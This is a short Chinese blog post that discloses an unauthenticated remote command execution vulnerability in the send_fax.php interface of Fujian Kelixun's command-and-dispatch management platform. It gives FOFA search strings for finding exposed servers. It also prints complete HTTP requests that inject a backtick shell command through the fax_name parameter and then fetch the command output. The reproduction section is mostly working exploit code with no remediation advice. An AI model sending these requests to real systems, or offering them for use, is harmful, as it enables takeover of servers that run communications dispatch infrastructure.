#  福建科立讯指挥调度管理平台send_fax远程命令执行漏洞   
原创 SXdysq  南街老友   2025-04-28 12:14  
  
   
  
> 字数 319，阅读大约需 2 分钟  
  
## 产品介绍  
  
福建科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。该产品旨在提供高效的指挥调度和管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务，并即时获取现场反馈和报告  
## 漏洞概述  
  
福建科立讯通信有限公司指挥调度管理平台send_fax.php接口处存在远程命令执行漏洞，未经身份认证的攻击者可通给该漏洞远程执行命令，写入后门文件可导致服务器失陷。  
## FOFA  
```
body="指挥调度管理平台"product="指挥调度管理平台"
```  
## 漏洞复现  
```
POST /api/client/fax/send_fax.php HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0Content-Length: 29Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeContent-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1fax_name=`id > PGSwhPeZ&LRt1Je.txt`.pdf
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtDOXkGh1zBshR9iakpfpF2UKAlemj3XTq33dXlrsA7ic5N1zt528EUvuYZMhib9W60KWfPGicYLzw1ffQ/640?from=appmsg "null")  
  
```
GET /api/client/fax/PGSwhPeZ&LRt1Je.txt HTTP/1.1Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtDOXkGh1zBshR9iakpfpF2UKpFhYCxSKhrSAJGribAJfZ0zyu2ia7M32P62r4MLWUUHfIIc9fldvebfg/640?from=appmsg "null")  
  
  
  
